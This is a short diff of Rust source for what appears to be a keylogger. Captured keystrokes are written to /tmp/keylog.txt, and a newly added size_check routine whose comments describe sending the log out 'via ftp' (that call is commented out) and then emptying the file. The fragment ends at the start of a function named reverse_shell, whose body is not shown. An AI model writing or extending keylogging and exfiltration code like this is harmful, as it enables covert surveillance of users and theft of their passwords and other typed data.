@@ -18,6 +18,7 @@ pub fn match_case(key: &Keycode) -> &'static str {
         .open("/tmp/keylog.txt")
         .expect("Failed to open file");
 
+    size_check(&mut file);
 
     // using match expression
     match *key {
@@ -41,6 +42,18 @@ pub fn match_case(key: &Keycode) -> &'static str {
             "Other"
         }
     }    
+}
+
+// check if file is too big
+// if it is, then send it via ftp
+fn size_check(file: &mut std::fs::File) {
+    let file_size = file.metadata().unwrap().len();
+    if file_size > 100 {
+        println!("File is too big");
+        // send_file(file);
+        // empty file
+        file.set_len(0).expect("Failed to empty file");
+    }
 }
 
 pub fn reverse_shell() {
